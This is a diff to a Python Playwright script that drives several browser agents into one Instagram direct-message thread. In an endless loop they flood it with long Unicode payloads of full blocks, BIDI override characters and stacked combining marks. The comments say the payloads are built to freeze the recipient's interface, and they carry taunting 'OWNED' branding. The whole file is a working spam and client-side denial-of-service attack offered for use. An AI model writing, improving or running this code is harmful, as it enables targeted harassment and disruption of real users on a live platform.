@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (VISIBLE-DEPTH V8)
+# 🚀 PROJECT: PRAVEER.OWNS (VISIBLE-OVERLOAD V9)
 # 📅 STATUS: HIGH-VISIBILITY | 20-MPS | TOTAL-LOCK
 
 import os, asyncio, random, sys
@@ -8,34 +8,36 @@ from playwright.async_api import async_playwright
 AGENT_COUNT = 3 
 
 def get_visible_payload(agent_id):
-    """Combines high-visibility branding with recursive layout isolates."""
+    """Generates a high-visibility, heavy-render block payload."""
     u_id = random.randint(100000, 999999)
-    # The 'Glue' ensures the browser treats the block as one unit
-    glue = "\u2060" 
+    # Using a mix of Full-Width spaces and Word Joiners
+    glue = "\u3000\u2060" 
     
-    # 💥 HIGH-VISIBILITY HEADER (Full-Width + Bold)
+    # 💥 THE HEADER
     header = f"👑_ＰＲＡＶＥＥＲ_ＰＡＰＡ_👑{glue}☠️_ＴＥＡＭ_ＤＥＶＥＬ_ＯＷＮＥＤ_☠️{glue}🆔_{u_id}{glue}"
     
-    # 🏗️ THE 'VISIBLE-BOMB'
-    # We use \u2588 (Full Block) and \u2067 (RLI)
-    # This creates a solid wall of text that is mathematically impossible to render quickly.
+    # 🏗️ THE 'VISIBLE-WALL'
+    # We use \u2588 (Full Block) + \u202E (BIDI Override)
+    # This creates a solid 'Black Hole' of text that freezes the UI thread.
+    z_tower = "̸" * 150
+    
     body = []
-    for i in range(150):
-        # We alternate the direction inside the nest
-        nest = "\u2067" if i % 2 == 0 else "\u2068"
-        # █ creates a heavy rasterization workload
-        body.append(f"{nest}█𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕿_█\u2069")
+    for i in range(120):
+        # We alternate BIDI direction to force the browser to flip the block
+        prefix = "\u202E" if i % 2 == 0 else "\u202D"
+        # █ is a raster-heavy character
+        body.append(f"{prefix}█_𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕿_█{z_tower}")
         
     return (header + glue.join(body))[:9990]
 
 async def run_striker(agent_id, context, target_id):
     await asyncio.sleep(agent_id * 5) 
     page = await context.new_page()
-    # Block media but allow fonts so YOU can see the impact
+    # Abort images but KEEP fonts/styles for visibility
     await page.route("**/*.{png,jpg,jpeg,svg,mp4}", lambda route: route.abort())
     
     try:
-        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Initializing Visible Strike...")
+        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Deploying Visible Strike...")
         await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="commit", timeout=120000)
         
         while True:
@@ -43,14 +45,14 @@ async def run_striker(agent_id, context, target_id):
                 box = page.get_by_role("textbox", name="Message")
                 await box.wait_for(state="visible", timeout=30000)
 
-                for _ in range(35):
+                for _ in range(30):
                     payload = get_visible_payload(agent_id)
                     await box.fill(payload)
                     await page.keyboard.press("Enter")
-                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Visible-Impact Sent")
+                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Block Delivered")
                     await asyncio.sleep(0.3) 
                 
-                await asyncio.sleep(4) 
+                await asyncio.sleep(5) 
 
             except Exception:
                 await asyncio.sleep(5)
